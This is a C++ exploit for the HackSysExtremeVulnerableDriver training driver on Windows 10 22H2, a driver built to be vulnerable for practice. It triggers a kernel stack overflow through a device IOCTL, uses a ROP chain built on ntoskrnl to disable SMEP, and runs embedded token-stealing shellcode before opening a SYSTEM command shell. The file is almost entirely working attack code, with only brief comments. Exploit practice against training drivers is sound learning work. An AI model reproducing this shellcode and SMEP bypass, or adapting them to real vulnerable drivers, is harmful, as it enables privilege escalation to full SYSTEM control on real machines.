// Tested on 22H2 build 19045.6456

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Psapi.h>

LPVOID GetBaseAddr(LPCWSTR drvname)
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{

		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
			{
				if (wcscmp(szDrivers, drvname) == 0)
				{
					return drivers[i];
				}
			}
		}
	}
	return 0;
}

int main()
{
	printf("[+] Executing CreateFile to get Handle from Device \"HackSysExtremeVulnerableDriver\"\n");
	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Successfully obtained Handle from Device\n");


	DWORD64 nt_base = (DWORD64)GetBaseAddr(L"ntoskrnl.exe");
	printf("[*] ntoskrnl base address is: 0x%p\n", nt_base);

	printf("[*] Set breakpoint now\n");
	(void)getchar(); //Explicitly ignore return value

	BYTE token_steal[] = { 0x65,0x48,0x8b,0x04,0x25,0x88,0x01,0x00,0x00,0x48,0x8b,0x80,0xb8,0x00,0x00,0x00,0x49,0x89,0xc0,0x4d,0x8b,0x80,0x48,0x04,0x00,0x00,0x49,0x81,0xe8,0x48,0x04,0x00,0x00,0x4d,0x8b,0x88,0x40,0x04,0x00,0x00,0x49,0x83,0xf9,0x04,0x75,0xe5,0x49,0x8b,0x88,0xb8,0x04,0x00,0x00,0x80,0xe1,0xf0,0x48,0x89,0x88,0xb8,0x04,0x00,0x00,0x65,0x48,0x8b,0x04,0x25,0x88,0x01,0x00,0x00,0x66,0x8b,0x88,0xe4,0x01,0x00,0x00,0x66,0xff,0xc1,0x66,0x89,0x88,0xe4,0x01,0x00,0x00,0x48,0x8b,0x90,0x90,0x00,0x00,0x00,0x48,0x8b,0x8a,0x68,0x01,0x00,0x00,0x4c,0x8b,0x9a,0x78,0x01,0x00,0x00,0x48,0x8b,0xa2,0x80,0x01,0x00,0x00,0x48,0x8b,0xaa,0x58,0x01,0x00,0x00,0x31,0xc0,0x0f,0x01,0xf8,0x48,0x0f,0x07,0x90,0x90,0x90,0x90 };

	LPVOID shellcode = VirtualAlloc(NULL, 512, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(shellcode, 0x90, 512);
	memcpy(shellcode, token_steal, sizeof(token_steal));
	
	DWORD payloadSize = 0x840;
	PDWORD64 InputBuffer = PDWORD64(VirtualAlloc(0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	memset(InputBuffer, 0x90, payloadSize);
	//InputBuffer[0] = 0x4343434343434343; // Overwrite Start of the buffer
	//InputBuffer[256] = 0x4444444444444444; // End of the buffer 0n256 * 0n8 = 0x800 bytes

	DWORD index = 259;
	InputBuffer[index] = nt_base + 0x5236d4; index++; // 0x1405236d4: pop rcx ; ret ; 
	InputBuffer[index] = 0x350ef8 & ~(1 << 20); index++; // Disable SMEP 
	InputBuffer[index] = nt_base + 0x3a0397; index++; // 0x1403a0397: mov cr4, rcx ; ret ;
	InputBuffer[index] = (DWORD64)shellcode; index++;

	DWORD IoControlCode = 0x222003;
	DWORD InputBufferLength = payloadSize; //This must be more than 0x800 to overflow
	ULONGLONG OutputBuffer = 0x0;
	DWORD OutputBufferLength = 0x0;
	DWORD lpBytesReturned; // No output returned for this crash

	printf("[+] Executing DeviceioControl()...\n");
	BOOL triggerIOCTL = DeviceIoControl(hDevice, IoControlCode, (LPVOID)InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);

	
	printf("[+] Opening NT Authority\\SYSTEM shell. \n\n");
	system("start cmd /k");

	return 0;
}

